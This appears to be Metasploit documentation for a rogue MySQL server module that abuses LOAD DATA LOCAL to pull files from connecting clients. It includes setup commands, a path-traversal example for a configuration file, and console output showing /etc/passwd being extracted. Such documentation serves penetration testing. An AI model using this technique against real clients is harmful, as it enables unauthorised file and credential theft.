## Overview

This module creates a rogue MySQL server which requests a file from the client. This is possible through the LOAD DATA LOCAL statement. The rogue server sends this statement to the client and gets access to any file the user has read permissions.

## Verification steps

1. Start `msfconsole`
2. Enter: `use auxiliary/server/mysql_rogue.py`
3. Enter: `run`

4. Start another `msfconsole`
5. Enter: `use auxiliary/scanner/mysql/mysql_hashdump`
6. Enter: `set RHOSTS 127.0.0.1`
7. Enter: `run`

8. You should see the data of the exfiltrated file

## Options

**output_file**
The file where the exfiltrated filedata should be stored. The default output_file is located `/tmp/mysql_rogue_output.txt`. 

**lhost**
The local IP address to expose the MySQL rogue server to. The default IP address is `127.0.0.1`.

**lport**
The local Port to expose the MySQL rogue server to. The default port is `3306`. 

**file**
The remote file to exfiltrate, e.g. `../../admin/include/configuration.php`. The default file is `/etc/passwd`. 

## Scenarios

### Ubuntu client 20.04

Start the mysql rogue server
```
msf6 > use auxiliary/server/mysqlrogue 
msf6 auxiliary(server/mysqlrogue) > options

Module options (auxiliary/server/mysqlrogue):

   Name         Current Setting              Required  Description
   ----         ---------------              --------  -----------
   file         /etc/passwd                  yes       File trying to retrieve
   lhost        127.0.0.1                    yes       Host to listen
   lport        3306                         yes       Port to listen
   output_file  /tmp/mysql_rogue_output.txt  no        Output file to save information to

msf6 auxiliary(server/mysqlrogue) > run
[*] Auxiliary module running as background job 0.

[*] Starting server...
msf6 auxiliary(server/mysqlrogue) > 
[*] Evil mysql server is now listening \ on 127.0.0.1:3306 -- Kill the job once done
```

Try to connect to the mysql Rogue Server with the metasploit module auxiliary/scanner/mysql/mysql_hashdump
```
msf6 > use auxiliary/scanner/mysql/mysql_hashdump 
msf6 auxiliary(scanner/mysql/mysql_hashdump) > options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME                   no        The username to authenticate as

msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(scanner/mysql/mysql_hashdump) > run

[-] 127.0.0.1:3306        - Auxiliary failed: NoMethodError undefined method `[]' for nil:NilClass
[-] 127.0.0.1:3306        - Call stack:
[-] 127.0.0.1:3306        -   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/mysql/mysql_hashdump.rb:61:in `run_host'
[-] 127.0.0.1:3306        -   /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb:124:in `block (2 levels) in run'
[-] 127.0.0.1:3306        -   /opt/metasploit-framework/embedded/framework/lib/msf/core/thread_manager.rb:105:in `block in spawn'
[*] Auxiliary module execution completed
```
Don't mind that the mysql_hashdump auxiliary failed. The file is already exfiltrated.

Follow the connection setup on mysql_rogue and watch the extracted file
```
[*] new connection from 127.0.0.1:33491
[*] new connection from 127.0.0.1:47838
[-] Target client has LOAD DATA LOCAL bit NOT set -- exploit will probably fail...
[*] Successfully extracted file from 127.0.0.1:47838:

root:x:0:0:Herr und Meister:/root:/bin/bash
bin:x:1:1:bin:/bin:/bin/bash
daemon:x:2:2:daemon:/sbin:/bin/bash
lp:x:4:7:lp daemon:/var/spool/lpd:/bin/bash
news:x:9:13:News system:/etc/news:/bin/bash
uucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp:/bin/bash
at:x:25:25::/var/spool/atjobs:/bin/bash
wwwrun:x:30:65534:Daemon user for apache:/tmp:/bin/bash
squid:x:31:65534:WWW proxy squid:/var/squid:/bin/bash
ftp:x:40:2:ftp account:/usr/local/ftp:/bin/bash
firewall:x:41:31:firewall account:/tmp:/bin/false
named:x:44:44:Nameserver Daemon:/var/named:/bin/bash
tapico:x:501:100:Thomas Prizzi:/home/tapico:/bin/bash
luke:x:502:100:Lukas Himmelsgeher:/home/luke:/bin/bash
lori:x:503:100:Lori Kalmar:/home/lori:/bin/bash
grayson:*:504:100:Grayson Death Carlyle:/home/grayson:/bin/bash
nobody:x:65534:65534:nobody:/tmp:/bin/bash

[*] extracted file saved to /tmp/mysql_rogue_output.txt
```
